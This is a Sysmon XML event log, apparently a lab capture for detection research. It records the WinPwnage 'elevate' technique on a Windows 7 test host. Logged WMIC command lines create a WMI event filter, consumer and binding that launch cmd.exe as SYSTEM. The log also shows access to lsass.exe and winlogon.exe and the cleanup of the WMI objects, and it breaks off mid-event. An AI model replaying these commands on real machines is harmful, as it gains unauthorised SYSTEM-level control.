<root>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T17:57:49.903159600Z" />
      <EventRecordID>16108</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="2020" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-11 17:57:49.903</Data>
      <Data Name="ProcessGuid">{365ABB72-0D1D-5CD7-0000-001020EF1500}</Data>
      <Data Name="ProcessId">3140</Data>
      <Data Name="Image">C:\Python27\python.exe</Data>
      <Data Name="FileVersion">?</Data>
      <Data Name="Description">?</Data>
      <Data Name="Product">?</Data>
      <Data Name="Company">?</Data>
      <Data Name="CommandLine">python  winpwnage.py -u elevate -5 -p c:\Windows\System32\cmd.exe</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-0807-5CD7-0000-002091450100}</Data>
      <Data Name="LogonId">0x14591</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=ECA93AAAA5039E12D2F0CC3F0C8F5AF8FDB15C71,MD5=E11683E4A1E88666DD5E0331F969E0C6,SHA256=B6B4BD10303797C209C4F3C3FCC863A925A77AE2C38090FB8B3FF1BF9C4DDE84,IMPHASH=F3F3DE6C332CF6049756A5B794EBD0C5</Data>
      <Data Name="ParentProcessGuid">{365ABB72-0C15-5CD7-0000-0010FB1C1500}</Data>
      <Data Name="ParentProcessId">2404</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe" </Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T17:58:22.809409600Z" />
      <EventRecordID>16109</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="2020" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-11 17:58:22.793</Data>
      <Data Name="ProcessGuid">{365ABB72-0D3E-5CD7-0000-0010680E1600}</Data>
      <Data Name="ProcessId">1832</Data>
      <Data Name="Image">C:\Python27\python.exe</Data>
      <Data Name="FileVersion">?</Data>
      <Data Name="Description">?</Data>
      <Data Name="Product">?</Data>
      <Data Name="Company">?</Data>
      <Data Name="CommandLine">python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-0807-5CD7-0000-002091450100}</Data>
      <Data Name="LogonId">0x14591</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=ECA93AAAA5039E12D2F0CC3F0C8F5AF8FDB15C71,MD5=E11683E4A1E88666DD5E0331F969E0C6,SHA256=B6B4BD10303797C209C4F3C3FCC863A925A77AE2C38090FB8B3FF1BF9C4DDE84,IMPHASH=F3F3DE6C332CF6049756A5B794EBD0C5</Data>
      <Data Name="ParentProcessGuid">{365ABB72-0C15-5CD7-0000-0010FB1C1500}</Data>
      <Data Name="ParentProcessId">2404</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe" </Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T17:58:23.215659600Z" />
      <EventRecordID>16110</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="2020" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-11 17:58:23.200</Data>
      <Data Name="ProcessGuid">{365ABB72-0D3F-5CD7-0000-0010DB251600}</Data>
      <Data Name="ProcessId">3184</Data>
      <Data Name="Image">C:\Windows\System32\wbem\WMIC.exe</Data>
      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
      <Data Name="Description">WMI Commandline Utility</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\System32\wbem\WMIC.exe" /namespace:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BotConsumer23", ExecutablePath="c:\Windows\System32\cmd.exe", CommandLineTemplate="c:\Windows\System32\cmd.exe"</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-0807-5CD7-0000-002091450100}</Data>
      <Data Name="LogonId">0x14591</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443</Data>
      <Data Name="ParentProcessGuid">{365ABB72-0D3E-5CD7-0000-0010680E1600}</Data>
      <Data Name="ParentProcessId">1832</Data>
      <Data Name="ParentImage">C:\Python27\python.exe</Data>
      <Data Name="ParentCommandLine">python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>20</EventID>
      <Version>3</Version>
      <Level>4</Level>
      <Task>20</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T17:58:23.340659600Z" />
      <EventRecordID>16111</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="4092" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="EventType">WmiConsumerEvent</Data>
      <Data Name="UtcTime">2019-05-11 17:58:23.340</Data>
      <Data Name="Operation">Created</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="Name"> "BotConsumer23"</Data>
      <Data Name="Type">Command Line</Data>
      <Data Name="Destination"> "c:\\Windows\\System32\\cmd.exe"</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>21</EventID>
      <Version>3</Version>
      <Level>4</Level>
      <Task>21</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T17:58:23.418784600Z" />
      <EventRecordID>16112</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="4092" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="EventType">WmiBindingEvent</Data>
      <Data Name="UtcTime">2019-05-11 17:58:23.418</Data>
      <Data Name="Operation">Created</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="Consumer"> "CommandLineEventConsumer.Name=\"BotConsumer23\""</Data>
      <Data Name="Filter"> "__EventFilter.Name=\"BotFilter82\""</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T17:58:23.450034600Z" />
      <EventRecordID>16113</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="2020" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-11 17:58:23.356</Data>
      <Data Name="ProcessGuid">{365ABB72-0D3F-5CD7-0000-00108B381600}</Data>
      <Data Name="ProcessId">3196</Data>
      <Data Name="Image">C:\Windows\System32\wbem\WMIC.exe</Data>
      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
      <Data Name="Description">WMI Commandline Utility</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\System32\wbem\WMIC.exe" /namespace:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name="BotFilter82"', Consumer='CommandLineEventConsumer.Name="BotConsumer23"'</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-0807-5CD7-0000-002091450100}</Data>
      <Data Name="LogonId">0x14591</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443</Data>
      <Data Name="ParentProcessGuid">{365ABB72-0D3E-5CD7-0000-0010680E1600}</Data>
      <Data Name="ParentProcessId">1832</Data>
      <Data Name="ParentImage">C:\Python27\python.exe</Data>
      <Data Name="ParentCommandLine">python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T17:58:23.590659600Z" />
      <EventRecordID>16114</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="2020" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-11 17:58:23.450</Data>
      <Data Name="ProcessGuid">{365ABB72-0D3F-5CD7-0000-001089471600}</Data>
      <Data Name="ProcessId">1616</Data>
      <Data Name="Image">C:\Windows\System32\wbem\WMIC.exe</Data>
      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
      <Data Name="Description">WMI Commandline Utility</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\System32\wbem\WMIC.exe" /namespace:"\\root\subscription" PATH __EventFilter CREATE Name="BotFilter82", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-0807-5CD7-0000-002091450100}</Data>
      <Data Name="LogonId">0x14591</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443</Data>
      <Data Name="ParentProcessGuid">{365ABB72-0D3E-5CD7-0000-0010680E1600}</Data>
      <Data Name="ParentProcessId">1832</Data>
      <Data Name="ParentImage">C:\Python27\python.exe</Data>
      <Data Name="ParentCommandLine">python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>19</EventID>
      <Version>3</Version>
      <Level>4</Level>
      <Task>19</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T17:58:39.746909600Z" />
      <EventRecordID>16115</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="4092" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="EventType">WmiFilterEvent</Data>
      <Data Name="UtcTime">2019-05-11 17:58:39.746</Data>
      <Data Name="Operation">Created</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="EventNamespace"> "root\\cimv2"</Data>
      <Data Name="Name"> "BotFilter82"</Data>
      <Data Name="Query"> "SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T17:58:50.090659600Z" />
      <EventRecordID>16116</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="2020" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-11 17:58:50.075</Data>
      <Data Name="ProcessGuid">{365ABB72-0D5A-5CD7-0000-001069031700}</Data>
      <Data Name="ProcessId">2544</Data>
      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
      <Data Name="FileVersion">6.1.7601.17514 (win7sp1_rtm.101119-1850)</Data>
      <Data Name="Description">Windows Command Processor</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">c:\Windows\System32\cmd.exe</Data>
      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
      <Data Name="User">NT AUTHORITY\SYSTEM</Data>
      <Data Name="LogonGuid">{365ABB72-8693-5CD7-0000-0020E7030000}</Data>
      <Data Name="LogonId">0x3e7</Data>
      <Data Name="TerminalSessionId">0</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163</Data>
      <Data Name="ParentProcessGuid">{365ABB72-0D3F-5CD7-0000-00107F541600}</Data>
      <Data Name="ParentProcessId">3212</Data>
      <Data Name="ParentImage">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
      <Data Name="ParentCommandLine">C:\Windows\system32\wbem\wmiprvse.exe -Embedding</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>10</EventID>
      <Version>3</Version>
      <Level>4</Level>
      <Task>10</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T17:58:54.762534600Z" />
      <EventRecordID>16117</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="2020" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-11 17:58:54.762</Data>
      <Data Name="SourceProcessGUID">{365ABB72-0D3E-5CD7-0000-0010680E1600}</Data>
      <Data Name="SourceProcessId">1832</Data>
      <Data Name="SourceThreadId">2796</Data>
      <Data Name="SourceImage">c:\python27\python.exe</Data>
      <Data Name="TargetProcessGUID">{365ABB72-8693-5CD7-0000-0010F4570000}</Data>
      <Data Name="TargetProcessId">444</Data>
      <Data Name="TargetImage">C:\Windows\system32\winlogon.exe</Data>
      <Data Name="GrantedAccess">0x1410</Data>
      <Data Name="CallTrace">C:\Windows\SYSTEM32\ntdll.dll+4591c|C:\Windows\system32\KERNELBASE.dll+8185|c:\python27\DLLs\_ctypes.pyd+ed6a|c:\python27\DLLs\_ctypes.pyd+d9d6|c:\python27\DLLs\_ctypes.pyd+999e|c:\python27\DLLs\_ctypes.pyd+a1ce|c:\python27\DLLs\_ctypes.pyd+5b71|C:\Windows\system32\python27.dll+8f14c|C:\Windows\system32\python27.dll+113384|C:\Windows\system32\python27.dll+112f24|C:\Windows\system32\python27.dll+110c7e|C:\Windows\system32\python27.dll+113001|C:\Windows\system32\python27.dll+112f12|C:\Windows\system32\python27.dll+110c7e|C:\Windows\system32\python27.dll+113001|C:\Windows\system32\python27.dll+112f12</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>10</EventID>
      <Version>3</Version>
      <Level>4</Level>
      <Task>10</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T17:58:54.762534600Z" />
      <EventRecordID>16118</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="2020" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-11 17:58:54.762</Data>
      <Data Name="SourceProcessGUID">{365ABB72-0D3E-5CD7-0000-0010680E1600}</Data>
      <Data Name="SourceProcessId">1832</Data>
      <Data Name="SourceThreadId">2796</Data>
      <Data Name="SourceImage">c:\python27\python.exe</Data>
      <Data Name="TargetProcessGUID">{365ABB72-8693-5CD7-0000-0010765E0000}</Data>
      <Data Name="TargetProcessId">492</Data>
      <Data Name="TargetImage">C:\Windows\system32\lsass.exe</Data>
      <Data Name="GrantedAccess">0x1410</Data>
      <Data Name="CallTrace">C:\Windows\SYSTEM32\ntdll.dll+4591c|C:\Windows\system32\KERNELBASE.dll+8185|c:\python27\DLLs\_ctypes.pyd+ed6a|c:\python27\DLLs\_ctypes.pyd+d9d6|c:\python27\DLLs\_ctypes.pyd+999e|c:\python27\DLLs\_ctypes.pyd+a1ce|c:\python27\DLLs\_ctypes.pyd+5b71|C:\Windows\system32\python27.dll+8f14c|C:\Windows\system32\python27.dll+113384|C:\Windows\system32\python27.dll+112f24|C:\Windows\system32\python27.dll+110c7e|C:\Windows\system32\python27.dll+113001|C:\Windows\system32\python27.dll+112f12|C:\Windows\system32\python27.dll+110c7e|C:\Windows\system32\python27.dll+113001|C:\Windows\system32\python27.dll+112f12</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T17:58:54.887534600Z" />
      <EventRecordID>16119</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="2020" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-11 17:58:54.793</Data>
      <Data Name="ProcessGuid">{365ABB72-0D5E-5CD7-0000-0010A1141700}</Data>
      <Data Name="ProcessId">2432</Data>
      <Data Name="Image">C:\Windows\System32\wbem\WMIC.exe</Data>
      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
      <Data Name="Description">WMI Commandline Utility</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\System32\wbem\WMIC.exe" /namespace:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="BotConsumer23" DELETE</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-0807-5CD7-0000-002091450100}</Data>
      <Data Name="LogonId">0x14591</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443</Data>
      <Data Name="ParentProcessGuid">{365ABB72-0D3E-5CD7-0000-0010680E1600}</Data>
      <Data Name="ParentProcessId">1832</Data>
      <Data Name="ParentImage">C:\Python27\python.exe</Data>
      <Data Name="ParentCommandLine">python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>20</EventID>
      <Version>3</Version>
      <Level>4</Level>
      <Task>20</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T17:58:54.903159600Z" />
      <EventRecordID>16120</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="4092" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="EventType">WmiConsumerEvent</Data>
      <Data Name="UtcTime">2019-05-11 17:58:54.903</Data>
      <Data Name="Operation">Deleted</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="Name"> "BotConsumer23"</Data>
      <Data Name="Type">Command Line</Data>
      <Data Name="Destination"> "c:\\Windows\\System32\\cmd.exe"</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>19</EventID>
      <Version>3</Version>
      <Level>4</Level>
      <Task>19</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T17:58:54.981284600Z" />
      <EventRecordID>16121</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="4092" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="EventType">WmiFilterEvent</Data>
      <Data Name="UtcTime">2019-05-11 17:58:54.981</Data>
      <Data Name="Operation">Deleted</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="EventNamespace"> "root\\cimv2"</Data>
      <Data Name="Name"> "BotFilter82"</Data>
      <Data Name="Query"> "SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T17:58:55.028159600Z" />
      <EventRecordID>16122</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="2020" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-11 17:58:54.918</Data>
      <Data Name="ProcessGuid">{365ABB72-0D5E-5CD7-0000-0010E6241700}</Data>
      <Data Name="ProcessId">4084</Data>
      <Data Name="Image">C:\Windows\System32\wbem\WMIC.exe</Data>
      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
      <Data Name="Description">WMI Commandline Utility</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\System32\wbem\WMIC.exe" /namespace:"\\root\subscription" PATH __EventFilter WHERE Name="BotFilter82" DELETE</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-0807-5CD7-0000-002091450100}</Data>
      <Data Name="LogonId">0x14591</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443</Data>
      <Data Name="ParentProcessGuid">{365ABB72-0D3E-5CD7-0000-0010680E1600}</Data>
      <Data Name="ParentProcessId">1832</Data>
      <Data Name="ParentImage">C:\Python27\python.exe</Data>
      <Data Name="ParentCommandLine">python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>21</EventID>
      <Version>3</Version>
      <Level>4</Level>
      <Task>21</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T17:58:55.090659600Z" />
      <EventRecordID>16123</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="4092" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
